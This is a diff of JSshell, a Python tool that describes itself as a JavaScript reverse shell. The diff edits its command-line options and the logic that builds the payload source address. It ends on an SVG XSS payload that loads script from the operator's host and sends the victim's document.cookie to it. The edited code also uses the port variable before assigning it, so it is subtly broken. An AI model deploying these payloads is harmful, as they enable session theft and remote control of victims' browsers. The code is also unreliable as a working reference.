@@ -29,21 +29,28 @@ exit, quit            Exit the JS shell'''
 
 
 parser = argparse.ArgumentParser(description='JSshell 3.1: javascript reverse shell')
-parser.add_argument('-p', help='local port number (default: 4848)', dest='port', default=4848)
-parser.add_argument('-s', help='local source address', dest='host', default='')
-parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
-parser.add_argument('-t', help='target address for ingress-as-a-server e.g. ngrok', dest='target', default=str())
-parser.add_argument('-c', help='command to execute after got shell', dest='command', default=str())
+parser.add_argument('-g', help='generate JS reverse shell payloads', dest='gene', action='store_true')
+parser.add_argument('-p', help='port number (default: 4848)', dest='port', default=4848)
+parser.add_argument('-s', help='source address (or hostname)', dest='host', default='')
+parser.add_argument('-t', help='target to be used in payloads, default: [host]:[port] from -s and -p', dest='target', default=str())
+parser.add_argument('-c', help='command to execute after get the shell', dest='command', default=str())
 parser.add_argument('-w', help='timeout for shell connection', dest='secs', type=float, default=0)
 parser.add_argument('-q', help='quiet mode', dest='quiet', action='store_true')
 
 
 args = parser.parse_args()
 
-host = format(args.host)
+host = args.host
+target = args.target
 
-if not len(host):
-    host = get('https://api.ipify.org').text
+if target:
+    source = target
+else:
+    if not host:
+        host = get('https://api.ipify.org').text
+
+    source = "//{0}:{1}".format(host, port)
+    
 try:
     port = int(format(args.port))
     if not 0 <= port <= 65535:
@@ -59,15 +66,8 @@ else:
     uprint = print
 
 gene = args.gene
-cmd = format(args.command)
-secs = float(format(args.secs))
-target = args.target
-
-if len(target) > 0 and gene:
-
-    source = "{0}".format(target)
-else:
-    source = "//{0}:{1}".format(host, port)
+cmd = args.command
+secs = args.secs
     
 payload = '''
     - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}?".concat(document.cookie)}},1010)>
